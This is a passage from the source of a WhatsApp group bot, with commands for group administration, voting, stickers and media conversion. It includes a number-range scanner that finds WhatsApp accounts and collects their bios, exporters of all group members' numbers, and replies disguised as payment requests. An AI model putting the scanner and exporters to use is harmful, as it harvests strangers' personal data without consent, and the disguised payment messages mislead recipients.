                reply(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    nyanBot2.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isSamu) return reply(mess.admin)
                if (!isBotAdmins) return StickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                reply(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    nyanBot2.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nyanBot2.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                reply(mess.done)
                break
                case "idgroup": case "groupid": {
if (!isSamu) return StickOwner()
let getGroups = await nyanBot2.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await nyanBot2.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await nyanBot2.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await nyanBot2.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return StickGroup()
if (!(isGroupAdmins || isSamu)) return StickAdmin()
xeonbigpp = await nyanBot2.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
nyanBot2.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return StickGroup()
if (!(isGroupAdmins || isSamu)) return StickAdmin()
let cmiggc = await nyanBot2.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
nyanBot2.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return StickGroup()
if (!m.mentionedJid[0]) return reply('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
nyanBot2.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return StickGroup()
if (!(isGroupAdmins || isSamu)) return StickAdmin()
if (!m.mentionedJid[0]) return reply('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
nyanBot2.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return StickGroup()
                if(!isSamu) return StickOwner()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nyanBot2.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                reply(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nyanBot2.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                reply(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nyanBot2.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                reply(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (!text) return reply('Text ?')
                await nyanBot2.groupUpdateSubject(m.chat, text)
                reply(mess.done)
                break
                case 'userjid':{
          	if(!isSamu) return StickOwner()
        const groupMetadata = m.isGroup ? await nyanBot2.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      reply(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!isSamu) return StickOwner()
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await nyanBot2.groupCreate(args.join(" "), [])
let response = await nyanBot2.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
nyanBot2.sendMessage(m.chat, { text:teksop, mentions: await nyanBot2.parseMention(teksop)}, {quoted:m})
} catch {
	reply(`Error`)
	}
}
break
    case 'setbotbio':{
if (!isSamu) return StickOwner()
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await nyanBot2.updateProfileStatus(text)
    reply(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return StickGroup()
if (!isAdmins && !isSamu) return StickAdmin()
if (!isBotAdmins) return StickBotAdmin()
    await nyanBot2.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!isSamu) return StickOwner()
    await nyanBot2.removeProfilePicture(nyanBot2.user.id)
    reply(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (!text) return reply('Text ?')
                await nyanBot2.groupUpdateDescription(m.chat, text)
                reply(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins) return reply(mess.admin)
                if (!isBotAdmins) return StickBotAdmin()
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await nyanBot2.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await nyanBot2.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await nyanBot2.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'tagall':
            case 'tag':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                nyanBot2.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'hidetag':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                nyanBot2.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return StickGroup()
                if (!isBotAdmins) return StickBotAdmin()
                if (!isAdmins) return reply(mess.admin)
                if (!m.quoted) return reply(`Reply media with caption ${prefix + command}`)
                nyanBot2.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (args[0] === 'close') {
                    await nyanBot2.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await nyanBot2.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Success Opening Group`))
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            break
            case 'editinfo':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (args[0] === 'open') {
                    await nyanBot2.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await nyanBot2.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Edit Group Info`))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let response = await nyanBot2.groupInviteCode(m.chat)
                nyanBot2.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await nyanBot2.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await nyanBot2.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return StickGroup()
            if (m.chat in vote) return reply(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return reply(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            reply(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            nyanBot2.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return StickGroup()
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            nyanBot2.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return StickGroup()
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            nyanBot2.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return StickGroup()
if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${nyanBot2.user.id}
`
nyanBot2.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return StickGroup()
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !isSamu) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                await nyanBot2.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`Reset Success`)
                    })
            break
                //bot status
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	nyanBot2.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    }
	
	break
	case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await nyanBot2.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    } else {
      await reply(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await reply(`Repository currently not available `)
  }
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
                await nyanBot2.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                reply(`Type ${prefix}owner and chat him`)
                break
            case 'speedtest': {
                reply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) nyanBot2.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) nyanBot2.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'runtime':
                let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
                nyanBot2.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
sendnyanBot2Message(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/nyancat.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
            case 'owner': {
                nyanBot2.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }
                }, {
                    quoted: m
                })
            }
            break
            //convert
case 's': case 'sticker': case 'stiker': {
if (!quoted) return reply(`Envia o etiqueta una Imagen/Video/gif con el comando ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await nyanBot2.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Envia o etiqueta una Imagen/Video/gif con el comando ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await nyanBot2.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Envia o etiqueta una Imagen/Video/gif con el comando ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
nyanBot2.downloadAndSaveMediaMessage(quoted, "gifee")
nyanBot2.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await nyanBot2.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await nyanBot2.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await StickWait()
                let media = await nyanBot2.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    nyanBot2.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await StickWait()
                let media = await nyanBot2.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await nyanBot2.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await StickWait()
                let media = await nyanBot2.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                nyanBot2.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await StickWait()
                let media = await nyanBot2.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                nyanBot2.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgxeon.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await StickWait()
